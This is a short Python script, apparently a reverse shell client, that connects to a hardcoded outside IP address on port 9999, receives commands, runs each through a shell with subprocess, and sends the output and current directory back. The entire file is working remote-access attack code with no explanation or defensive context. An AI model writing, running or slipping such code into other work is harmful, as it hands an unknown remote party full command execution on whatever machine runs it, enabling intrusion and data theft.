from locale import currency
import socket
import os
import subprocess

s = socket.socket()
host = '45.55.249.79'
# host = '192.168.191.86'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    
    if len(data.decode('utf-8')) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin = subprocess.PIPE, stderr= subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte.decode('utf-8'))
        currentWD = os.getcwd() + '>'
        s.send(str.encode(output_str + currentWD))
        print(output_str)
